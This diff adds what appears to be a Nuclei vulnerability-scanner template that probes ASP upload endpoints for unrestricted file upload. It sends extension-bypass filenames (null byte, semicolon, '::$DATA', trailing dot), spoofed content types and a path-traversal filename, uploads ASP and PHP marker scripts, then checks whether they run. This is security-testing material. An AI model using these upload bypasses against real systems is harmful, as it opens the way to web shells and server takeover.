@@ -1,0 +1,228 @@
+id: asp-file-upload-complete
+
+info:
+  name: ASP File Upload Complete Test
+  author: ChiragArtani
+  severity: high
+  description: |
+    Complete ASP file upload vulnerability test including upload, bypass techniques, and verification.
+    Tests multiple file types, content-types, and verifies file accessibility and execution.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+    cwe-id: CWE-434
+  tags: file-upload,asp,bypass,rce,webshell,critical
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+
+variables:
+  test_content: "hello nuclei test"
+  asp_payload: |
+    <%
+    Response.Write("NUCLEI_ASP_" & Now() & "_SUCCESS")
+    %>
+  php_payload: |
+    <?php echo "NUCLEI_PHP_" . date('Y-m-d_H:i:s') . "_SUCCESS"; ?>
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/admin/upload.asp"
+      - "{{BaseURL}}/upload.asp"
+      - "{{BaseURL}}/admin/upload/upload.asp"
+      - "{{BaseURL}}/uploadify/upload.asp"
+    
+    payloads:
+      filename:
+        - "nuclei-test.txt"
+        - "nuclei.asp"
+        - "nuclei.aspx" 
+        - "nuclei.php"
+        - "nuclei.jsp"
+        - "nuclei.cer"
+        - "nuclei.asp."
+        - "nuclei.asp "
+        - "nuclei.asp%00.txt"
+        - "nuclei.asp;.txt"
+        - "nuclei.asp::$DATA"
+        - "nuclei.asp%20"
+        - "nuclei.asa"
+        - "nuclei.cdx"
+      
+      content_type:
+        - "text/plain"
+        - "application/octet-stream"
+        - "image/jpeg"
+        - "image/png"
+        - "text/html"
+        - "application/x-msdownload"
+      
+      payload_type:
+        - "txt"
+        - "asp"
+        - "php"
+    
+    body: |
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="id"
+      
+      1
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="Filedata"; filename="{{filename}}"
+      Content-Type: {{content_type}}
+      
+      {{if (eq payload_type "txt")}}{{test_content}}{{end}}{{if (eq payload_type "asp")}}{{asp_payload}}{{end}}{{if (eq payload_type "php")}}{{php_payload}}{{end}}
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+    
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Requested-With: XMLHttpRequest
+    
+    attack: clusterbomb
+    stop-at-first-match: false
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      
+      - type: word
+        part: body
+        words:
+          - '"err":0'
+          - '"err": 0'
+          - '"error":0'
+          - '"status":"success"'
+          - 'savename'
+          - 'filename'
+          - 'uploaded'
+        condition: or
+    
+    extractors:
+      - type: json
+        part: body
+        name: uploaded_file
+        json:
+          - '.savename'
+          - '.filename' 
+          - '.name'
+        internal: true
+      
+      - type: regex
+        part: body
+        name: response_status
+        regex:
+          - '{"err":\s*0[^}]*}'
+          - '{"error":\s*0[^}]*}'
+          - '{"status":\s*"success"[^}]*}'
+      
+      - type: kval
+        part: body
+        name: upload_details
+        kval:
+          - filename
+          - content_type
+          - payload_type
+
+  # Verification request - checks if uploaded file is accessible
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/upload/{{uploaded_file}}"
+      - "{{BaseURL}}/upload/{{uploaded_file}}"
+      - "{{BaseURL}}/uploads/{{uploaded_file}}"
+      - "{{BaseURL}}/files/{{uploaded_file}}"
+    
+    redirects: true
+    max-redirects: 3
+    
+    matchers-condition: or
+    matchers:
+      # Text file verification
+      - type: dsl
+        name: text-file-accessible
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "hello nuclei test")'
+        condition: and
+      
+      # ASP execution verification  
+      - type: dsl
+        name: asp-execution-success
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "NUCLEI_ASP_")'
+          - 'contains(body, "_SUCCESS")'
+        condition: and
+      
+      # PHP execution verification
+      - type: dsl
+        name: php-execution-success  
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "NUCLEI_PHP_")'
+          - 'contains(body, "_SUCCESS")'
+        condition: and
+      
+      # File accessible but not executed
+      - type: dsl
+        name: file-accessible-not-executed
+        dsl:
+          - 'status_code == 200'
+          - 'len(body) > 0'
+        condition: and
+    
+    extractors:
+      - type: regex
+        part: body
+        name: execution_output
+        regex:
+          - 'NUCLEI_(ASP|PHP)_[0-9\-_:]+_SUCCESS'
+      
+      - type: dsl
+        name: file_access_result
+        dsl:
+          - 'status_code'
+          - 'len(body)'
+      
+      - type: regex
+        part: body
+        name: file_content_preview
+        regex:
+          - '^.{0,100}'
+
+# Advanced directory traversal and path bypass attempts
+  - method: POST
+    path:
+      - "{{BaseURL}}/admin/upload.asp"
+    
+    body: |
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="id"
+      
+      1
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="Filedata"; filename="../../../nuclei-traversal.asp"
+      Content-Type: text/plain
+      
+      <%Response.Write("NUCLEI_TRAVERSAL_SUCCESS")%>
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+    
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"err":0'
+          - '"error":0'
+        condition: or
+    
+    extractors:
+      - type: json
+        part: body
+        name: traversal_result
+        json:
+          - '.savename'
